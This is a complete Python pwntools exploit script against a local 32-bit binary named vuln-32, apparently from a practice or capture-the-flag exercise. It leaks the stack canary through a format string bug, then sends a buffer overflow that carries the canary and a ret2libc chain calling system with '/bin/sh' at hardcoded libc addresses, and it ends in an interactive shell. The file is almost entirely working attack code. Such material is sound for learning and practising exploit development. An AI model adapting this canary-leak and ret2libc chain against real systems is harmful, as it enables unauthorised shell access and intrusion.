#!/usr/bin/env python3

# Exploit conditions
# - ASLR Disabled
# - PIE disables
# - NX enabled
# - Stack canary enabled

from pwn import *

context.update(arch='i386', os='linux')

offset = 64
# Let's choose local vs remote
p = process("./vuln-32") 

p.recvuntil("Leak me")

# abuse format string vulnerability on the firt input (gets()) for printf()
payload = b'%23$p'

p.sendline(payload)

p.recvline()
leak = int(p.recvline(),16)
log.info('cookie is : {}'.format(hex(leak))) # The leaked value is printed.

#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xf7c4c800 <system>
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0xf7db5faa ("/bin/sh")

system = p32(0xf7c4c800)
binsh = p32(0xf7db5faa)
exit_addr = p32(0xf7c3bc90)

payload = b'A'*offset
payload += p32(leak)
payload += b'BBBB' # Filling to reach EIP overwrite
payload += b'CCCC' # Filling
payload += b'DDDD' # Filling
payload += system  # OVerwrite is here: execute a 
payload += exit_addr
payload += binsh
payload += p32(leak)

log.info('Sending second buffer with cookie and payload')

p.recvuntil("Overflow me")
p.sendline(payload)
p.interactive()

